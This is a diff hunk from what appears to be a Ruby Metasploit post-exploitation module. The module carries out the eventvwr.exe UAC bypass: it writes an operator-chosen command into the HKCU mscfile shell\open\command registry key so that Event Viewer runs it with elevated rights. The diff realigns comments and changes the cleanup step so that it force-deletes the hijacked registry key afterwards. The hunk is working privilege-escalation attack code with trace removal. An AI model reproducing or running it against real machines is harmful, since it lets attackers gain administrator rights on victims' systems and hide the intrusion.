@@ -144,11 +144,11 @@ def ls_stage1
 
   r=''
   session = client
-  exec_comm = datastore['CMD_COMMAND']                        # my cmd command to execute
-  # def_value = '(default)'                                   # registry key value (/ve = default = empty)
-  comm_path = '%WINDIR%\\System32\\cmd.exe /c'                # %comspec% path 
-  vul_serve = '%WINDIR%\\System32\\eventvwr.exe'              # vulnerable soft to be hijacked
-  reg_clean = 'REG ADD HKCU\\Software\\Classes\\mscfile'      # registry hive to be clean in the end
+  exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
+  # def_value = '(default)'                                    # registry key value (/ve = default = empty)
+  comm_path = '%WINDIR%\\System32\\cmd.exe /c'                 # %comspec% path 
+  vul_serve = '%WINDIR%\\System32\\eventvwr.exe'               # vulnerable soft to be hijacked
+  reg_clean = 'REG DELETE HKCU\\Software\\Classes\\mscfile /f' # registry hive to be clean in the end
   regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
   comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
